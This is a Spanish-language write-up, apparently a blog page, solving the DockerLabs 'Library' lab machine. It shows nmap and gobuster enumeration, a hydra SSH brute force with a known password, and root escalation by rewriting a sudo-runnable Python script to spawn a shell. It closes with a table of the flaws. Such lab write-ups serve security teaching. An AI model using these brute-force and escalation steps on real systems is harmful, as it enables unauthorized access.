@@ -1,0 +1,193 @@
+---
+title: Library
+description: Resolución completa de la máquina virtual *Library* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Library**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
+El laboratorio expone un servidor web que no presenta vulnerabilidades evidentes. Mediante fuerza bruta sobre el servicio SSH con una contraseña conocida y un diccionario de usuarios, se identifica un usuario válido que permite acceder al sistema.
+Una vez dentro, se encuentra un script Python en `/opt/script.py` que el usuario puede ejecutar como root sin contraseña mediante `sudo`. Al modificar el script para que ejecute una shell, se obtiene acceso completo como `root`.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Library',
+    Autor: 'El Pingüino de Mario',
+    Dificultad: 'Fácil',
+    Fecha: '13/05/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Library.zip
+sudo bash auto_deplo.sh Library.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1748411786/ipScan_skcisu.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Library/{content,exploits,nmap,scripts}
+cd Library
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **22/tcp** — SSH
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1750142710/Ports_vzlyjp.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p22,80 172.17.0.2 -oN targeted
+```
+
+![Servicios](https://res.cloudinary.com/dewqswzke/image/upload/v1750142712/Services_kkyk7r.png)
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios para encontrar posibles endpoints en el servicio del puerto 80:
+
+```bash
+gobuster dir -u http://172.17.0.2/ \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
+  -x php,html,txt,js -t 200
+```
+
+![Gobuster](https://res.cloudinary.com/dewqswzke/image/upload/v1750142710/Gobuster_axdbuw.png)
+
+**Archivos detectados:**
+- `/index.html`
+  ![Index.html](https://res.cloudinary.com/dewqswzke/image/upload/v1750142710/Index_hrvoyr.png)
+- `/index.php`
+  ![Index.php](https://res.cloudinary.com/dewqswzke/image/upload/v1750142710/Index.php_f2og6m.png)
+
+No se encuentran formularios ni rutas sensibles adicionales.
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Fuerza bruta SSH
+
+No se encontraron vulnerabilidades web, por lo que se procede a realizar un ataque de fuerza bruta sobre SSH utilizando una contraseña conocida y un diccionario de usuarios:
+
+```bash
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt \
+      -p JIFGHDS87GYDFIGD ssh://172.17.0.2 -t 4
+```
+
+![Hydra](https://res.cloudinary.com/dewqswzke/image/upload/v1750142710/Hydra_a8bkql.png)
+
+Se identifica un usuario válido y se accede al sistema vía SSH:
+
+```bash
+ssh usuario@172.17.0.2
+```
+
+![SSH](https://res.cloudinary.com/dewqswzke/image/upload/v1750142712/Ssh_tnvsvs.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De usuario → root
+
+Se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1750142713/Sudo-l_a2ec99.png)
+
+El usuario puede ejecutar el script `/opt/script.py` como root sin contraseña.
+
+El script es modificable. Se edita para que ejecute una shell:
+
+```python
+import os
+os.setuid(0)
+os.system("/bin/sh")
+```
+
+Se ejecuta el script con `sudo`:
+
+```bash
+sudo python3 /opt/script.py
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1750142711/Root_qe8nuo.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Falta de protección contra fuerza bruta en SSH",
+      severity: "Alta",
+      impact: "Acceso no autorizado mediante diccionario de usuarios"
+    },
+    {
+      vulnerability: "Script Python ejecutado por root y modificable por usuario",
+      severity: "Crítica",
+      impact: "Escalada de privilegios a root"
+    },
+    {
+      vulnerability: "Configuración insegura de sudo en script Python",
+      severity: "Crítica",
+      impact: "Ejecución de código arbitrario como root"
+    },
+    {
+      vulnerability: "Falta de validación de integridad de scripts ejecutados con privilegios",
+      severity: "Alta",
+      impact: "Manipulación de scripts para ejecución de comandos maliciosos"
+    }
+  ]}
+/>
